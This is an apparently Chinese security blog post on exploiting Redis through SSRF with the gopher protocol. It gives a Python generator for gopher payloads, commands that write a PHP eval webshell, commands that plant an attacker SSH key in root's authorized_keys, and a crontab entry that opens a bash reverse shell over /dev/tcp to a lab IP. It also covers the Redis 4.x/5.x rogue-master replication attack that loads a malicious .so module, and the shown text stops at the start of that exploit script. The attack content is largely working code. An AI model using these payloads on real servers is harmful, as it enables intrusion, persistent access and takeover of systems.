        <content type="html"><![CDATA[<h1 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。这里我们要介绍的是关于<code>redis</code>中SSRF的利用，如果有什么错误的地方还请师傅们不吝赐教/握拳。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>文章中的数据包构造会涉及到redis的<code>RESP</code>协议，所以我们这里先科普一下，了解RESP协议的师傅可以跳过=。=</p><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><ol><li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li><li>服务器根据命令实现回复一种RESP类型。</li></ol><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p><p>我们用<code>tcpdump</code>来抓个包来测试一下<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port 6379 -w ./Desktop/1.pcap</span><br></pre></td></tr></tbody></table></figure><p></p><p>redis客户端中执行如下命令<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.163.128:6379&gt; <span class="built_in">set</span> name <span class="built_in">test</span></span><br><span class="line">OK</span><br><span class="line">192.168.163.128:6379&gt; get name</span><br><span class="line"><span class="string">"test"</span></span><br><span class="line">192.168.163.128:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>抓到的数据包如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>hex转储看一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p><h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了<br><code>Gopher</code> 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能未授权或者能通过弱口令认证访问到Redis服务器</span><br></pre></td></tr></tbody></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见的SSRF攻击方式大概有这几种：</p><ol><li><p>绝对路径写webshell</p></li><li><p>写ssh公钥</p></li><li><p>写contrab计划任务反弹shell</p></li></ol><p>下面我们逐个实现</p><h2 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h2><p>这个方法比较常用，也是用得最多的=。=</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 '&lt;?php eval($_GET["cmd"]);?&gt;'</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p><p>写了一个简单的脚本，转化为redis RESP协议的格式<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.163.128"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"> <span class="string">"set 1 {}"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"${IFS}"</span>)),</span><br><span class="line"> <span class="string">"config set dir {}"</span>.format(path),</span><br><span class="line"> <span class="string">"config set dbfilename {}"</span>.format(filename),</span><br><span class="line"> <span class="string">"save"</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">"AUTH {}"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">cmd=<span class="string">""</span></span><br><span class="line">cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"${IFS}"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"${IFS}"</span>,<span class="string">" "</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184952-f1bb74e2-a55b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>生成payload后，用<code>curl</code>打一波</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184859-d1be7432-a55b-1.png" alt="image.png"></p><p>执行成功，我们看一波shell是否写入成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713185023-04486f84-a55c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>成功写入</p><h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p><h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">'</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">ssh_pub=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>生成payload<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183658-246f246c-a55a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br><code>curl</code>打一波<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183322-a37e93d8-a559-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>我们来查看一波是否成功写入<p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183413-c1a43818-a559-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>成功写入，尝试连接</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183504-e0404db6-a559-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>成功连接</p><h2 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h2><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p><ol><li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p></li><li><p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p></li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis的命令如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n'</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure><p></p><p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse_ip=<span class="string">"192.168.163.132"</span></span><br><span class="line">reverse_port=<span class="string">"2333"</span></span><br><span class="line">cron=<span class="string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">"root"</span></span><br><span class="line">path=<span class="string">"/var/spool/cron"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>生成一波，尝试反弹shell<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174818-57eaa354-a553-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174721-35fd0ebc-a553-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>成功反弹shell</p><h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到RR师傅在朋友圈发的redis4.x/5.x rce，原本想去搞搞看的，但是无奈本菜鸡正处于考试预习阶段QAQ，所以没什么心思去看 =。=，直到考完试才安心下来看，不过网上已经很多关于redis rce分析的文章，但是我发现大多数都是一笔带过没怎么看懂（我理解能力比较差），所以决定自己搞一下。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>利用条件：</p><ul><li>能未授权或者能通过弱口令认证访问到Redis服务器</li></ul><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>建立主从复制，有3种方式：</p><ol><li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li><li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li><li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li></ol><p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p><p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">redis-server /etc/redis/redis6380.conf</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get <span class="built_in">test</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">exit</span></span><br><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; get <span class="built_in">test</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">set</span> <span class="built_in">test</span> <span class="string">"test"</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6380&gt; get <span class="built_in">test</span></span><br><span class="line"><span class="string">"test"</span></span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">exit</span></span><br><span class="line">root@kali:/usr/bin<span class="comment"># redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; get <span class="built_in">test</span></span><br><span class="line"><span class="string">"test"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p><h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p><p>恶意so文件编写：<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" title="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用步骤，贴一下PPT上的步骤</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712235651-a9a794c2-a4bd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>slave和master的握手协议过程</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713002514-a0feb180-a4c1-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>图中一些常量说明<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */</span><br><span class="line">/* --- 握手状态开始 --- */</span><br><span class="line">#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */</span><br><span class="line">#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */</span><br><span class="line">#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */</span><br><span class="line">#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */</span><br><span class="line">#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */</span><br><span class="line">#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */</span><br><span class="line">#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */</span><br><span class="line">#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */</span><br><span class="line">#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */</span><br><span class="line">/* --- 握手状态结束 --- */</span><br><span class="line">#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */</span><br></pre></td></tr></tbody></table></figure><p></p><p>我这里主要讲一下最重要的那一步，就是利用全量复制将master上的<code>RDB</code>文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p><p>那我们为什么一定要用全量复制呢？原因如下。<br>当slave向master发送<code>PSYNC</code>命令之后，一般会得到三种回复：</p><ol><li>+FULLRESYNC：进行全量复制。</li><li>+CONTINUE：进行增量同步。</li><li>-ERR：当前master还不支持PSYNC。</li></ol><p><strong>全量复制的过程：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004119-dfd75b44-a4c3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><ul><li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，我们来测试以下看看是不是真的如此</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004651-a59d01da-a4c4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><ul><li><p>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制，slave并对master发来的runid和offest进行保存</p></li><li><p>master把自己的runid和offset发给slave</p></li><li><p>master进行bgsave，生成RDB文件</p></li><li><p>master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</p></li><li><p>slave加载RDB文件和缓冲区数据</p></li></ul><p><strong>增量复制（又称部分复制）过程：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713005510-cf74b1aa-a4c5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p><p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ul><li>配置一个我们需要以master身份给slave传输so文件的服务，大致流程如下<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PING 测试连接是否可用</span><br><span class="line">+PONG 告诉slave连接可用</span><br><span class="line">REPLCONF 发送REPLCONF信息，主要是当前实例监听端口</span><br><span class="line">+OK 告诉slave成功接受</span><br><span class="line">REPLCONF 发送REPLCONF capa</span><br><span class="line">+OK 告诉slave成功接受</span><br><span class="line">PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</span><br></pre></td></tr></tbody></table></figure></li></ul><p>如下图所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713014728-1d6e49a0-a4cd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><ul><li>将要攻击的redis服务器设置成我们的slave</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF ip port</span><br></pre></td></tr></tbody></table></figure><ul><li>设置RDB文件<br>PS:这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code></li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></tbody></table></figure><ul><li>告诉slave使用全量复制并从我们配置的Rouge Server接收module<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;</span><br></pre></td></tr></tbody></table></figure></li></ul><p>PS：其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>贴一下exp，写得比较丑，为了节省文章的篇幅其它功能我就没有加上去了，有需要的师傅可以自行添加=。=<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 